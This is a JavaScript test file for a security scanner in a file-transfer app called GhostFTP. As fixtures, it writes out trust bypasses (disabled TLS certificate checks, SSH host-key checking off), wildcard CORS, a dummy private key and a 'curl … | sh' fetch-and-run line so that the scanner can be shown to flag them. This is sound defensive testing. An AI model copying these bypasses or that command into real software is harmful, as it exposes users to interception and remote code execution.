import assert from "node:assert/strict";
import test from "node:test";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {scanDangerous,audit,inspectPlatformSecurityConfig} from "./full-security-code-audit.mjs";

test("detects explicit TLS and SSH trust verification bypasses in shipping paths",()=>{
  const cases=[
    ['ghostftp-desktop/src-tauri/src/session/ftp.rs','danger_accept_invalid_certs(true)',"tls-certificate-bypass"],
    ['tools/ghostftp-runtime/main.go','&tls.Config{InsecureSkipVerify: true}',"tls-certificate-bypass"],
    ['macos/Sources/GhostFTPMacApp/Services/SSH.swift','StrictHostKeyChecking=no',"ssh-host-key-bypass"],
    ['tools/ghostftp-installer/main.go','curl -k https://example.invalid',"unsafe-curl-tls"]
  ];
  for(const [path,source,id] of cases)assert.equal(scanDangerous(path,source)[0]?.id,id);
});
test("never treats human documentation or test fixtures as shipped runtime",()=>{
  assert.deepEqual(scanDangerous("docs/audits/SECURITY.md","curl -k"),[]);
  assert.deepEqual(scanDangerous("macos/Tests/Mock.swift","StrictHostKeyChecking=no"),[]);
  assert.deepEqual(scanDangerous("ghostftp-desktop/src-tauri/src/known_hosts.rs","safe nofollow secure"),[]);
});
test("real repository security gates remain present and no obvious unsafe trust bypass ships",()=>{
  const report=audit();
  assert.ok(report.inventory.sourceFileCount>150);
  assert.deepEqual(report.blockingPatterns,[]);
  assert.deepEqual(report.missingSecurityGuards,[]);
  assert.equal(report.passed,true);
  assert.ok(report.findings.some(x=>x.surface==="macos FTPS/SFTP" && x.state==="not-implemented"));
});

test("persisted Agent Bridge authorization remains revocable through Security settings", () => {
  const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
  const read = (file) => fs.readFileSync(path.join(root, file), "utf8");
  const ui = read("ghostftp-desktop/src/components/Settings.tsx");
  const store = read("ghostftp-desktop/src/stores/bridgeStore.ts");
  const ipc = read("ghostftp-desktop/src/lib/ipc.ts");
  const commands = read("ghostftp-desktop/src-tauri/src/commands.rs");
  const native = read("ghostftp-desktop/src-tauri/src/bridge.rs");
  const app = read("ghostftp-desktop/src-tauri/src/lib.rs");
  assert.ok(ui.includes("<AgentBridgeSecurityCard/>"), "Agent Bridge controls must stay reachable");
  assert.ok(ui.includes("Confirm revoke all access"), "revocation requires explicit UI confirmation");
  assert.ok(ui.includes("status.policy.allowAll"), "automatic approval must be visible");
  assert.ok(ui.includes("status.enabledSessions"), "live session grants must be visible");
  assert.ok(store.includes("ipc.bridgeRevokeAllAccess()"));
  assert.ok(ipc.includes('invoke<BridgeStatus>("bridge_revoke_all_access")'));
  assert.ok(commands.includes("pub async fn bridge_revoke_all_access"));
  assert.ok(app.includes("commands::bridge_revoke_all_access,"));
  assert.ok(native.includes("pub async fn revoke_all_access"));
  assert.ok(native.includes("config.enabled_profiles.is_empty()"));
  assert.ok(native.includes("revoke_all_access_clears_runtime_profiles_and_approval_policy"));
});

test("repository security inventory finds every occurrence and prohibits unsafe browser/CLI bridges", () => {
  const source = [
    "Access-Control-Allow-Origin: *",
    "Access-Control-Allow-Origin: *",
    "-----BEGIN PRIVATE KEY-----\nQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB\n-----END PRIVATE KEY-----",
    "curl https://untrusted.invalid/unsafe.sh | sh"
  ].join("\n");
  const events = scanDangerous("ghostftp-desktop/src-tauri/src/bridge.rs", source);
  assert.equal(events.filter((event) => event.id === "unsafe-local-cors").length, 2);
  assert.ok(events.some((event) => event.id === "private-key-literal"));
  assert.ok(events.some((event) => event.id === "curl-pipe-shell"));
  assert.deepEqual(events.filter((event) => event.id === "unsafe-local-cors").map((event) => event.line), [1, 2]);
});

test("PEM format mention is not mistaken for a committed private key", () => {
  assert.deepEqual(
    scanDangerous("ghostftp-desktop/src-tauri/src/keys.rs",
      '/// OpenSSH uses -----BEGIN OPENSSH PRIVATE KEY----- as a header.'),
    [],
  );
});

test("all four maintained native platform security configurations fail closed on weakening", () => {
  const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
  const paths = [
    "ghostftp-desktop/src-tauri/tauri.conf.json",
    "ghostftp-desktop/src-tauri/capabilities/default.json",
    "android/app/src/main/AndroidManifest.xml",
    "android/app/src/main/res/xml/data_extraction_rules.xml",
    "android/app/src/main/java/com/ghostftp/android/CloudNetworkSafety.kt",
    "macos/Sources/GhostFTPMacApp/Security/KeychainStore.swift",
    "tools/ghostftp-runtime/security.go",
  ];
  const baseline = Object.fromEntries(paths.map(p => [p, fs.readFileSync(path.join(root,p),"utf8")]));
  assert.deepEqual(inspectPlatformSecurityConfig(baseline), []);
  const weaken = (file, before, after, expected) => {
    assert.ok(baseline[file].includes(before), "test fixture missing: " + file);
    const candidate = {...baseline, [file]: baseline[file].replace(before, after)};
    assert.ok(inspectPlatformSecurityConfig(candidate).some(x => x.path === file && x.required.includes(expected)),
      "weakening undetected: " + file + " " + expected);
  };
  weaken(paths[0], "requireSignedVersion\": true", "requireSignedVersion\": false", "signed updater");
  weaken(paths[0], "script-src 'self'", "script-src *", "strict CSP");
  weaken(paths[1], '"dialog:default"', '"shell:allow-execute"', "without broad shell");
  weaken(paths[2], 'android:allowBackup="false"', 'android:allowBackup="true"', "backups disabled");
  weaken(paths[3], '<exclude domain="file" path="." />', '<include domain="file" path="." />', "file");
  weaken(paths[4], '.followSslRedirects(false)', '.followSslRedirects(true)', "trusted cloud");
  weaken(paths[5], 'kSecAttrAccessibleWhenUnlockedThisDeviceOnly', 'kSecAttrAccessibleAfterFirstUnlock', "Keychain");
  weaken(paths[6], 'dec.Decode(&struct{}{})', 'decoderSkipsExtraJSON()', "Go local runtime");
});
